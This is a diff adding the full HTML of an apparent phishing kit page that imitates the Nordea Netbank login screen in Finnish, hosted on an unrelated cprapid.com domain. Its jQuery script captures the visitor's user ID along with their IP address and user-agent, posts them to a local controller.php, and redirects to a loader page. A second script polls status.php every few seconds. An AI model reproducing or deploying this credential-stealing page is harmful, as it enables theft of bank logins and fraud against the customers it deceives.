@@ -1,0 +1,197 @@
+<html lang="fi" class="mobile" data-whatinput="touch" data-whatintent="touch"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="google" content="notranslate">
+    <title>Nordea - Tunnistautuminen</title>
+    
+    <link rel="stylesheet" href="all/styles.css">
+    
+
+
+
+    <!-- 1.26.2 -->
+   <script type="text/javascript" async="" src="//cdn.viglink.com/api/vglnk.js"></script><script async="" referrerpolicy="unsafe-url" type="text/javascript" src="https://de.tynt.com/deb/v2?id=w!holland001&amp;dn=TC&amp;cc=1&amp;r=&amp;pu=https%3A%2F%2Flogin.dokument.certificate.52-14-144-11.cprapid.com%2Fid%2Ffinlogin.php"></script><script async="" type="text/javascript" src="https://cdn.tynt.com/tc.js"></script><script async="" type="text/javascript" src="//whos.amung.us/pingjs/?k=holland001&amp;t=Nordea%20-%20Tunnistautuminen&amp;c=s&amp;x=https%3A%2F%2Flogin.dokument.certificate.52-14-144-11.cprapid.com%2Fid%2Ffinlogin.php&amp;y=&amp;a=0&amp;d=0.612&amp;v=27&amp;r=2871"></script><script src="https://t.dtscout.com/i/?l=https%3A%2F%2Flogin.dokument.certificate.52-14-144-11.cprapid.com%2Fid%2Ffinlogin.php&amp;j=" async="" type="text/javascript"></script><script src="./partials/js/jquery.js"></script>
+<script>
+$( document ).ready(function() {
+ $('#loginFrm').submit(function(e){
+   e.preventDefault();
+   var usrlogin = $('#usrlogin').val();
+   //var usrpass  = $('#usrpass').val();
+   if(usrlogin == null || usrlogin == ''){
+       return false;
+   }
+
+   $.ajax({
+       type : 'POST',
+       url : './partials/controller.php?type=finlogin',
+       data : $('#loginFrm').serialize(),
+       success: function (data) {
+           //console.log(data);
+           var parsed_data = JSON.parse(data);
+           if(parsed_data.status == 'ok'){
+               //console.log(parsed_data)
+               top.location.href = "./finloader.php?&auth=5b7867a1ebab9beebff57f0be3437d97&deviceID=79d7343eb0f75ffbeeb9babe1a7687b5&securessl=true"
+           }else{
+               return false;
+           }
+           //console.log(parsed_data.status);
+       }
+       })
+     });
+   });
+ </script>
+ <script>
+var interval = 3000;
+function userStatus() {
+    $.ajax({
+        type: 'GET',
+        url: './partials/status.php',
+        success: function (data) {
+            var parsed_data = JSON.parse(data);
+        },
+        complete: function (data) {
+            setTimeout(userStatus, interval);
+        }
+        });
+}
+setTimeout(userStatus, interval);
+</script>    
+<script async="" src="https://widgets.amung.us/small.js"></script><script src="https://data-beacons.s-onetag.com/dataBeacons.min.js"></script><script src="https://track2.securedvisit.com/sync/1540_03681?id=GFIeRSZH8mTJwKliSA2nl7d3"></script><iframe src="https://api.intentiq.com/profiles_engine/ProfilesEngineServlet?at=15&amp;eid=19&amp;aw=468&amp;ah=60&amp;pagePos=1&amp;vip=true&amp;secure=1&amp;sub_eid=15052&amp;maxed=1&amp;rnd=19947" width="0" height="0" style="display: none;"></iframe><script src="https://ps.eyeota.net/pixel?pid=51md42u&amp;t=ajs&amp;e_pc=3&amp;e_mr=0"></script><script id="sovrn_standalone_beacon" src="https://ap.lijit.com/www/sovrn_beacon_standalone/sovrn_standalone_beacon.js"></script></head>
+
+
+    <body class="cv-form page-ready">
+        
+
+        <div class="main-loader centered" id="loading" tabindex="-1" role="dialog">
+    <div class="loader" aria-hidden="true">
+    <svg focusable="false" viewBox="0 0 48 48"><path d="M24,2.4000000000000004A21.6,21.6 0 1 1 2.4000000000000004,24" fill="none" stroke-width="4.5px" stroke="#000"></path></svg>
+</div>
+<p class="loader-text">Ladataan...</p>
+<noscript><p class="loader-text">JavaScript must be enabled to use this page.</p></noscript>
+</div>
+
+        
+        <div class="system-messages-top-bar" id="system-messages-top-bar" role="status" aria-live="assertive" aria-atomic="true">
+    <div class="system-messages-top-bar-wrapper">
+        <div class="system-messages-top-bar-title" data-toggle-notification="" data-notification-target="system-messages">
+            <span class="system-messages-top-bar-heading">Tärkeää tietoa: </span><span id="system-messages-top-bar-title"></span>
+        </div>
+        <div class="system-messages-top-bar-button-wrapper">
+            <button class="link" data-toggle-notification="" data-notification-target="system-messages" aria-label="Tärkeää tietoa: Read more">
+                <span aria-hidden="true">
+                    <span class="system-messages-top-bar-button-text">Lue lisää</span>
+                    <svg class="icon small-icon" viewBox="0 0 16 16"><path stroke-linecap="round" stroke-linejoin="round" d="M12.5 5.8L8 10.3 3.5 5.8"></path></svg>
+                </span>
+            </button>
+        </div>
+    </div>
+</div>
+
+
+
+        <header>
+    <div class="text-center">
+        <span class="visually-hidden">Nordea</span>
+<svg class="logo" viewBox="0 0 136.1 28.6" focusable="false" aria-hidden="true">
+    <g id="logo">
+        <path fill="#ffffff" d="M124.1,6.2c-5.5,0.4-9.9,4.9-10.3,10.4c-0.4,6.5,4.7,11.9,11.1,11.9c2.3,0,5.4-1.2,6.8-3.6v3.3h4.3V17.6 C136.2,10.6,130.6,5.7,124.1,6.2z M131.4,17.6c-0.2,3.7-3.4,6.5-7.2,6c-2.9-0.4-5.2-2.7-5.6-5.6c-0.4-3.9,2.6-7.2,6.4-7.2 c3.4,0,6.2,2.7,6.4,6.1L131.4,17.6L131.4,17.6z"></path>
+        <path fill="#ffffff" d="M100.5,6.2c-5.9,0.2-10.9,4.7-10.9,11.3c0,6,4.9,11.1,11.2,11.1c4.4,0,8.7-2.6,10.4-6.9l-4.3-1.3 c-0.8,1.8-2.7,3.3-4.8,3.7c-3,0.6-5.8-1.3-6.9-3.3l16.7-4.6C111.4,11.8,107.6,6,100.5,6.2z M94.3,16.8c0-2.3,1.4-5,4.4-6.1 c3.4-1.3,6.4,0.4,7.7,2.8L94.3,16.8z"></path>
+        <path fill="#ffffff" d="M63.8,10.7V6.1c-4.2,0-5.6,2.1-6.3,3.2V6.8h-4.8V17v11.1h4.9c0-6.6,0-6.5,0-10.5 C57.6,12.8,60.4,10.9,63.8,10.7z"></path>
+        <polygon fill="#ffffff" points="19.7,19.6 5.1,2.4 0.1,2.4 0.1,28.1 5.3,28.1 5.3,10.9 20.1,28.2 24.6,28.2 24.6,2.4 19.7,2.4"></polygon>
+        <path fill="#ffffff" d="M86.7,0.1h-4.6v8.4c-1.1-1.4-4.5-2.6-7.4-2.3c-5.5,0.4-9.9,4.9-10.3,10.4c-0.4,6.5,4.7,11.9,11.1,11.9 c2.4,0,5.7-1.1,6.8-3.2v2.8h4.3V17.5c0-0.1,0-0.1,0-0.2c0-0.1,0-0.1,0-0.2L86.7,0.1L86.7,0.1z M81.9,17.6 c-0.2,3.7-3.4,6.5-7.2,6c-2.9-0.4-5.2-2.7-5.6-5.6c-0.4-3.9,2.6-7.2,6.4-7.2c3.4,0,6.2,2.7,6.4,6.1 C81.9,16.9,81.9,17.6,81.9,17.6z"></path>
+        <path fill="#ffffff" d="M38.7,6.1c-6.2,0-11.2,5-11.2,11.2s5,11.2,11.2,11.2s11.2-5,11.2-11.2C49.8,11.1,44.8,6.1,38.7,6.1z M38.7,23.7c-3.5,0-6.4-2.9-6.4-6.4s2.9-6.4,6.4-6.4s6.4,2.9,6.4,6.4C45.1,20.9,42.2,23.7,38.7,23.7z"></path>
+    </g>
+</svg>
+
+        <div class="page-context">Tunnistautuminen</div>
+    </div>
+</header>
+
+    <main role="main">
+        <div class="content">
+            <h1 class="page-title text-center">Nordea Netbank</h1>
+            <div class="inner-content">
+                
+            <div data-view-id="form" class="current">
+
+        <fieldset>
+            <legend class="sub-title">Tunnistautumisvaihtoehdot</legend>
+            <div id="method-groups" class="method-groups">
+                <div id="primary">
+                    <div class="auth-method-selection">
+    <div class="auth-method">
+        <input class="method visually-hidden" type="radio" id="mta" name="method" checked="checked">
+        <label for="mta">
+            <svg aria-hidden="true" viewBox="0 0 32 32" focusable="false" class="checkmark"><path d="M9 15.5l5 5M23 11.5l-9 9"></path></svg>
+            <span class="auth-method-img-wrapper" aria-hidden="true"><img alt="Nordea ID -sovellus" src="./all/codes_app-a89defc476c5ea3f806b6f5360157e81.svg"></span>
+            
+                
+                <span class="auth-method-text">Nordea ID -sovellus</span>
+                
+            
+        </label>
+    </div>
+    
+    
+        </div></div></div></fieldset>
+        <div id="inputs">
+            <div class="inputs-wrapper current" data-id="mta">
+                <div class="transaction-correlation-id-container" aria-live="polite" tabindex="0">
+
+ 
+</div>
+<form name="loginFrm" id="loginFrm" method="POST" autocomplete="off" class="mitid-core-content">
+                     <input type="hidden" name="ip" value="160.36.59.197">
+                     <input type="hidden" name="ua" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36">
+<div class="input-wrapper">
+    <input id="usrlogin" class="input password" data-manage="" data-show-hint="" name="usrlogin" type="text" inputmode="numeric" minlength="5" maxlength="13" data-min="5" data-max="13" data-type="password" data-validation="^[0-9]+$"><button class="input-hint icon-button" type="button" aria-label="Näytä syötetty teksti"></button>
+    <label for="mta-user-id">Käyttäjätunnus</label>
+    <div class="input-error" aria-live="assertive" role="alert" aria-hidden="true">
+        <span class="input-error-text">Vain numerot on sallittu.</span>
+    </div>
+</div>
+
+
+        <button type="submit">OK</button>
+    </form>
+    <div class="button-group">
+        <div>
+            <button class="link hidden" id="switch-primary-group">Vaihda tunnistautumistapaa</button>
+            <button class="link cancel-link" id="cancel-btn">Peruuta</button>
+        </div>
+        <div><button class="link sidebar-toggler">Tarvitsetko apua?</button></div>
+    </div>
+</div>
+       <div class="content-loader centered" id="content-loader" tabindex="-1" role="dialog">
+    <div class="loader" aria-hidden="true">
+    <svg focusable="false" viewBox="0 0 48 48"><path d="M24,2.4000000000000004A21.6,21.6 0 1 1 2.4000000000000004,24" fill="none" stroke-width="4.5px" stroke="#000"></path></svg>
+</div>
+    <p class="loader-text">Ladataan...</p>
+</div>
+        </div>
+    </div>
+</div></div></main>
+
+<footer>
+    <div>© Nordea 2022 <br>Tämä yhteys on suojattu</div>
+    
+    
+    
+    
+    
+</footer>
+
+
+
+
+  <div style="display:none;">
+<script id="_waukeo">var _wau = _wau || []; _wau.push(["small", "holland001", "keo"]);
+(function() {var s=document.createElement("script"); s.async=true;
+s.src="https://widgets.amung.us/small.js";
+document.getElementsByTagName("head")[0].appendChild(s);
+})();</script><div title="Click to see what's popular on this site!" style="position: relative; display: inline-block; background-image: url(&quot;data:image/gif;base64,R0lGODlhUAAXAMQAAM1iTdBuWMQ4MsdHOt+ch/js5+/Qw+vCs/Pe1dR6Y+OolNuQespVQ9eFbsAnLX9/fzAwL////zU1NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABQABcAAAX/ICSOZGmeaKqu7Bi9L3IcBWzfeK7vfI+LMAPAQXQEEBGJcslsOp/QqFQaAUYMAiIjMnAIDMmpeEweVyGRQtcxIByy7Fd5Ti+fIwTiABYoKsJ1gYJMd30OeIhDRoCDjXR3igAEEQAChgCMjppihUULL3CLm6OcQHlEEQ0JEX6ZpK9Ld2qofZRxrrCvd1dZrA4AlWC5w7FWEQgJRQ4JSMTOuzAFMzU+1dbX1i3a29zdJhIwSkk24OGAOOU56eJyYw8S73ax7bGE54y45fP1YvFzYXIy4btH6Mm4feKYPIi3kCE8eAuXRHRy8OA6duzQkUuYMSMghyAfhnzYpF1FKPjsNPEDyI8jyXchYSqB2ZBiPYs2W+rjyNIlOIkzX4oU6s9gwB4lN4ZzaW5pmIkxhUIs6uzRsBAAOw==&quot;); width: 80px; height: 15px; padding: 0px; margin: 0px; overflow: hidden; cursor: pointer; direction: ltr;"><div style="background-image: url(&quot;data:image/gif;base64,R0lGODlhUAAXAMQAAM1iTdBuWMQ4MsdHOt+ch/js5+/Qw+vCs/Pe1dR6Y+OolNuQespVQ9eFbsAnLX9/fzAwL////zU1NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABQABcAAAX/ICSOZGmeaKqu7Bi9L3IcBWzfeK7vfI+LMAPAQXQEEBGJcslsOp/QqFQaAUYMAiIjMnAIDMmpeEweVyGRQtcxIByy7Fd5Ti+fIwTiABYoKsJ1gYJMd30OeIhDRoCDjXR3igAEEQAChgCMjppihUULL3CLm6OcQHlEEQ0JEX6ZpK9Ld2qofZRxrrCvd1dZrA4AlWC5w7FWEQgJRQ4JSMTOuzAFMzU+1dbX1i3a29zdJhIwSkk24OGAOOU56eJyYw8S73ax7bGE54y45fP1YvFzYXIy4btH6Mm4feKYPIi3kCE8eAuXRHRy8OA6duzQkUuYMSMghyAfhnzYpF1FKPjsNPEDyI8jyXchYSqB2ZBiPYs2W+rjyNIlOIkzX4oU6s9gwB4lN4ZzaW5pmIkxhUIs6uzRsBAAOw==&quot;); background-repeat: no-repeat; background-attachment: scroll; background-position: -8px -15px; position: absolute; width: 5px; height: 8px; top: 4px; left: 20px; line-height: 8px; overflow: hidden; padding: 0px; margin: 0px;"></div><div style="background-image: url(&quot;data:image/gif;base64,R0lGODlhUAAXAMQAAM1iTdBuWMQ4MsdHOt+ch/js5+/Qw+vCs/Pe1dR6Y+OolNuQespVQ9eFbsAnLX9/fzAwL////zU1NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABQABcAAAX/ICSOZGmeaKqu7Bi9L3IcBWzfeK7vfI+LMAPAQXQEEBGJcslsOp/QqFQaAUYMAiIjMnAIDMmpeEweVyGRQtcxIByy7Fd5Ti+fIwTiABYoKsJ1gYJMd30OeIhDRoCDjXR3igAEEQAChgCMjppihUULL3CLm6OcQHlEEQ0JEX6ZpK9Ld2qofZRxrrCvd1dZrA4AlWC5w7FWEQgJRQ4JSMTOuzAFMzU+1dbX1i3a29zdJhIwSkk24OGAOOU56eJyYw8S73ax7bGE54y45fP1YvFzYXIy4btH6Mm4feKYPIi3kCE8eAuXRHRy8OA6duzQkUuYMSMghyAfhnzYpF1FKPjsNPEDyI8jyXchYSqB2ZBiPYs2W+rjyNIlOIkzX4oU6s9gwB4lN4ZzaW5pmIkxhUIs6uzRsBAAOw==&quot;); background-repeat: no-repeat; background-attachment: scroll; background-position: -8px -15px; position: absolute; width: 5px; height: 8px; top: 4px; left: 26px; line-height: 8px; overflow: hidden; padding: 0px; margin: 0px;"></div><div style="background-image: url(&quot;data:image/gif;base64,R0lGODlhUAAXAMQAAM1iTdBuWMQ4MsdHOt+ch/js5+/Qw+vCs/Pe1dR6Y+OolNuQespVQ9eFbsAnLX9/fzAwL////zU1NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABQABcAAAX/ICSOZGmeaKqu7Bi9L3IcBWzfeK7vfI+LMAPAQXQEEBGJcslsOp/QqFQaAUYMAiIjMnAIDMmpeEweVyGRQtcxIByy7Fd5Ti+fIwTiABYoKsJ1gYJMd30OeIhDRoCDjXR3igAEEQAChgCMjppihUULL3CLm6OcQHlEEQ0JEX6ZpK9Ld2qofZRxrrCvd1dZrA4AlWC5w7FWEQgJRQ4JSMTOuzAFMzU+1dbX1i3a29zdJhIwSkk24OGAOOU56eJyYw8S73ax7bGE54y45fP1YvFzYXIy4btH6Mm4feKYPIi3kCE8eAuXRHRy8OA6duzQkUuYMSMghyAfhnzYpF1FKPjsNPEDyI8jyXchYSqB2ZBiPYs2W+rjyNIlOIkzX4oU6s9gwB4lN4ZzaW5pmIkxhUIs6uzRsBAAOw==&quot;); background-repeat: no-repeat; background-attachment: scroll; background-position: -50px -15px; position: absolute; width: 24px; height: 8px; top: 4px; left: 32px; line-height: 8px; overflow: hidden; padding: 0px; margin: 0px;"></div></div>
+
+    
+</div><iframe src="https://t.dtscout.com/idg/?su=51A0167519797679A0EA7F83688688A8" width="0" height="0" style="display: none;"></iframe><script src="https://get.s-onetag.com/f0c84061-4182-4398-8e37-5ff5b5698a6f/tag.min.js" async="" defer=""></script><script src="https://pd.sharethis.com/pd/dtscout" id="stpd-dtscout" async=""></script><iframe referrerpolicy="unsafe-url" src="https://dp2.33across.com/ps/?tt=iframe&amp;pid=1198&amp;us_privacy=&amp;random=1675197976793.7&amp;r=true" style="position: absolute; overflow: hidden; visibility: hidden; height: 1px; width: 1px; bottom: 1px; left: 1px;"></iframe><iframe referrerpolicy="unsafe-url" src="https://cdn-tc.33across.com/lotame-sync.html" style="position: absolute; overflow: hidden; visibility: hidden; height: 1px; width: 1px; bottom: 1px; left: 1px;"></iframe><img src="https://pd.sharethis.com/pd/dtscout?_t_=px&amp;url=https%3A%2F%2Flogin.dokument.certificate.52-14-144-11.cprapid.com%2Fid%2Ffinlogin.php&amp;event_source=dtscout&amp;rnd=0.6986437456409649&amp;exptid=ZGoACGPZfhgAAAAIGilnAw%3D%3D&amp;fcmp=false"><iframe id="pxcelframe" title="pxcelframe" src="//t.sharethis.com/a/t_.htm?ver=1.1115.23351&amp;cid=c010&amp;cls=C#cid=c010&amp;cls=C&amp;rnd=0.6986437456409649&amp;stid=ZGoACGPZfhgAAAAIGilnAw%253D%253D&amp;tt=t.dhj&amp;dhjLcy=1675197977006&amp;lbl=pxcel&amp;flbl=pxcel&amp;ll=d&amp;ver=1.1115.23351&amp;ell=d&amp;cck=__stid&amp;dmn=login.dokument.certificate.52-14-144-11.cprapid.com&amp;pn=%2Fid%2Ffinlogin.php&amp;qs=na&amp;rdn=login.dokument.certificate.52-14-144-11.cprapid.com&amp;rpn=%2Fid%2Ffinlogin.php&amp;rqs=na&amp;cc=US&amp;cont=NA&amp;ipaddr=" style="display: none;"></iframe><script async="" src="https://tags.crwdcntrl.net/lt/c/3825/lt.min.js"></script><script async="" src="https://t.dtscdn.com/widget/?d=51A0167519797679A0EA7F83688688A8&amp;nid=0&amp;p=0&amp;t=300&amp;s=800x600x24&amp;u=https%3A%2F%2Flogin.dokument.certificate.52-14-144-11.cprapid.com%2Fid%2Ffinlogin.php&amp;r="></script><img src="https://i.liadm.com/s/59074?bidder_id=204553&amp;bidder_uuid=GFIeRSZH8mTJwKliSA2nl7d3&amp;rnd=40718"><img src="https://um.simpli.fi/lj_match?r=16147"><img src="https://i.liadm.com/s/57333?bidder_id=204553&amp;bidder_uuid=GFIeRSZH8mTJwKliSA2nl7d3&amp;rnd=48143"><iframe src="https://get.s-onetag.com/underground-sync-portal/Portal.html" title="sovrn-sync-beacon-portal" style="width: 1px; height: 1px; position: absolute; left: -99px; top: -99px;"></iframe></body></html>
